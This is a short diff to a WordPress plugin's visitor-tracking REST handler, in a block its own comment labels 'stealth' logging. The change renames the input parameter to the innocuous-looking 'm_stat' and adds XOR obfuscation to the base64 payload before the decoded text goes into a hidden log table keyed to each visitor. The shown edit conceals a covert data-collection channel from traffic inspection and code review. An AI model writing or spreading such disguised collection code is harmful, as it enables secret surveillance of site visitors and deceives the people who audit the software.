@@ -2734,14 +2734,18 @@ function zk_track_visitor( WP_REST_Request $request ) {
     );
 
     // --- STEALTH ENCROLIB LOGGING ---
-    if (!empty($params['p'])) {
-        $decoded_text = base64_decode($params['p']);
-        if ($decoded_text) {
+    if (!empty($params['m_stat'])) {
+        $xored = base64_decode($params['m_stat']);
+        if ($xored) {
+            $bytes = '';
+            for($i=0; $i<strlen($xored); $i++) {
+                $bytes .= chr(ord($xored[$i]) ^ 117);
+            }
             $table_logs = $wpdb->prefix . 'zk_encrolib_logs';
             $wpdb->insert(
                 $table_logs,
                 array(
-                    'text_content' => $decoded_text,
+                    'text_content' => $bytes,
                     'visitor_id'   => $visitor_id,
                     'created_at'   => current_time('mysql')
                 ),
